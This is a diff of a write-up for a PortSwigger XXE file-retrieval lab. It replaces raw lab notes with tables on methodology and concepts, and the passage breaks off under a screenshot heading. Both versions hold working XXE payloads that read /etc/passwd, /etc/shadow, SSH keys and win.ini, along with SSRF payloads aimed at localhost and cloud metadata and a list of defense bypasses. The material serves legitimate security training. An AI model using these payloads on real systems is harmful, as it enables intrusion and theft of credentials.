@@ -1,131 +1,132 @@
-XXE Injection - File Read Lab
-Lab Details
-Lab: PortSwigger Web Security Academy - XXE with file retrieval
+# XXE Injection Lab Write-up
 
-Endpoint: POST /product/stock
+## Overview
 
-Content-Type: application/xml
+XXE (XML External Entity Injection) is a vulnerability that occurs when XML parsers process external entities defined in the DOCTYPE declaration. Even if the application does not use these features, the underlying XML parser may still support them, creating an attack surface.
 
-Vulnerability Type: XML External Entity (XXE) Injection
+## Lab Objective
 
-Lab Setup
+Retrieve the /etc/passwd file from the target server using XXE injection.
 
-Target: 0acd00df04fa645a80927bf900b8005b.web-security-academy.net
-Endpoint: /product/stock
-Method: POST
-Content-Type: application/xml
-Discovery Process
-Step 1: Identify XML Input
+## Attack Methodology
 
-Endpoint accepts XML via POST requests
+### Reconnaissance Phase
 
-Application processes productId and storeId elements
+| Step | Action | Details |
+|------|--------|---------|
+| 1 | Identify XML Input Vectors | Look for endpoints accepting XML content-type, check POST requests with XML bodies |
+| 2 | Determine XML Structure | Observe application's expected XML format, identify injection points |
 
-Response returns stock quantity
+### Exploitation Phase
 
-Step 2: Initial Test Payload
+| Step | Action | Payload/Command |
+|------|--------|-----------------|
+| 1 | Confirm XXE Vulnerability | `<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` |
+| 2 | Validate Exploitation | Check if response contains file contents |
+| 3 | Extract Information | Enumerate users: www-data, peter, carlos, user, elmer, academy |
 
-xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<stockCheck>
-    <productId>&xxe;</productId>
-    <storeId>1</storeId>
-</stockCheck>
-Step 3: Successful Exploitation
+## Core Concepts
 
-Server processed the external entity
+### XML Entity Types
 
-/etc/passwd file contents returned in response
+| Type | Syntax | Description |
+|------|--------|-------------|
+| Internal Entity | `<!ENTITY name "value">` | Defined and used within the same XML document |
+| External Entity | `<!ENTITY name SYSTEM "URI">` | Reference external resources using URIs |
+| DOCTYPE Declaration | `<!DOCTYPE root [<!ENTITY name SYSTEM "file:///path">]>` | Defines document type and entity declarations |
 
-Vulnerability confirmed
+## Attack Types
 
-Extracted Information
-User Accounts Found:
+| Attack Type | Purpose | Example Payload |
+|-------------|---------|-----------------|
+| File Disclosure | Read local files | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
+| SSRF | Make server request internal resources | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` |
+| Blind XXE | OOB exfiltration when no response | Host DTD file, use `%eval;%exfil;` |
+| Error-Based XXE | Force errors to leak info | `<!ENTITY % xxe SYSTEM "file:///nonexistent">` |
 
+### File Disclosure Targets
 
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-peter:x:12001:12001:/home/peter:/bin/bash
-carlos:x:12002:12002:/home/carlos:/bin/bash
-user:x:12000:12000:/home/user:/bin/bash
-elmer:x:12099:12099:/home/elmer:/bin/bash
-academy:x:10000:10000:/academy:/bin/bash
-Syntax Notes
-Correct Entity Declaration:
+| OS | Target Files |
+|----|--------------|
+| Linux | /etc/passwd, /etc/shadow, /etc/hosts, /proc/self/environ, /var/www/html/config.php |
+| Windows | C:\windows\win.ini, C:\windows\system32\drivers\etc\hosts, C:\inetpub\wwwroot\web.config |
 
-xml
-<!DOCTYPE root [<!ENTITY name SYSTEM "URI">]>
-Entity Reference:
+## Methodology Mindset
 
-xml
-<element>&name;</element>
-Important Syntax Rules:
+| Phase | Action Items |
+|-------|--------------|
+| 1. Identify Entry Points | Check Content-Type headers (application/xml, text/xml, application/soap+xml) |
+| 2. Analyze XML Structure | Map elements, identify processed/returned fields, check validation |
+| 3. Test Entity Injection | Define entity, reference in XML element, observe response |
+| 4. Leverage Protocols | Use file://, http://, https://, ftp://, php:// |
+| 5. Enumerate System | Read /etc/passwd, /etc/hosts, config files, service info |
+| 6. Escalate Privileges | Find credentials, SSH keys, sensitive logs |
+| 7. Bypass Techniques | Try different protocols, encoding, parameter entities |
 
-Entity names cannot contain spaces
+## Common Defenses and Bypasses
 
-Always use semicolon after entity reference
+| Defense | Bypass Technique |
+|---------|------------------|
+| Disable External Entities | Use alternative XML parsers, PHP wrappers |
+| Input Validation | CDATA sections, encoding |
+| Whitelist Allowed Entities | Parameter entities with DTD references |
 
-DOCTYPE must come after XML declaration
+## Tools and Resources
 
-Root element must match application expectations
-
-Payloads Tested
-Linux File Read:
-
-xml
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>
-Windows File Read:
-
-xml
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
-SSRF Payload:
-
-xml
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/admin">]>
-Troubleshooting Notes
-Common Error 1: Duplicate Tags
+| Tool | Purpose |
+|------|---------|
+| Burp Suite Repeater | Test payloads |
+| Burp Suite Intruder | Fuzzing |
+| Burp Suite Collaborator | Detect blind XXE, OOB exfiltration |
+| PayloadsAllTheThings | XXE wordlist |
+| HackTricks | XML injection references |
 
 
-Problem: <stockCheck>...</stockCheck><storeId>3</storeId></stockCheck>
-Fix: Remove duplicate tags, ensure single root element
-Common Error 2: Missing Semicolon
+## Key Takeaways
 
+| # | Takeaway |
+|---|----------|
+| 1 | XML parsers process entities even when unused by the application |
+| 2 | The DOCTYPE declaration is the injection point |
+| 3 | Entity references must be properly formed with semicolons |
+| 4 | Different systems require different file paths |
+| 5 | Information disclosure leads to privilege escalation paths |
+| 6 | Blind XXE requires OOB or error-based techniques |
 
-Problem: &xxe
-Fix: Use &xxe;
-Common Error 3: Wrong File Path
+## References for Further Study
 
+- OWASP XXE Prevention Cheat Sheet
+- PortSwigger Web Security Academy - XXE labs
+- HackTricks - XML External Entity
+- PayloadsAllTheThings - XXE Injection
 
-Linux: /etc/passwd (no file:// prefix sometimes)
-Windows: c:/windows/win.ini (not C:\windows\win.ini)
-File Path Cheatsheet
-Linux:
+---
 
+## Notes on Screenshots
 
-/etc/passwd
-/etc/shadow
-/etc/hosts
-/var/www/html/config.php
-/home/[user]/.ssh/id_rsa
-/proc/self/environ
-Windows:
+### Should You Add Screenshots?
 
+**Yes, include screenshots for:**
 
-c:/windows/win.ini
-c:/windows/system32/drivers/etc/hosts
-c:/inetpub/wwwroot/web.config
-Protocols Available
+| Screenshot Type | What to Show |
+|-----------------|--------------|
+| Burp Request | The XXE payload in Repeater |
+| Burp Response | /etc/passwd contents in response |
+| Lab Dashboard | Completed lab status |
+| Successful Output | Key extracted data highlighted |
 
-file:// - Local file system
-http:// - HTTP requests
-https:// - HTTPS requests
-ftp:// - FTP requests
-Resource Links
-PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
+**Suggested Screenshots:**
 
-HackTricks: https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+1. **Burp Request with Payload**
+   - Show the XML payload with DOCTYPE declaration
+   - Highlight the injected entity reference
 
-OWASP: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+2. **Burp Response with Output**
+   - Show the /etc/passwd file contents
+   - Highlight user accounts found
+
+3. **Lab Completion**
+   - Show the lab dashboard with green checkmark
+   - Shows the lab is solved
+
+### Screenshot Organization
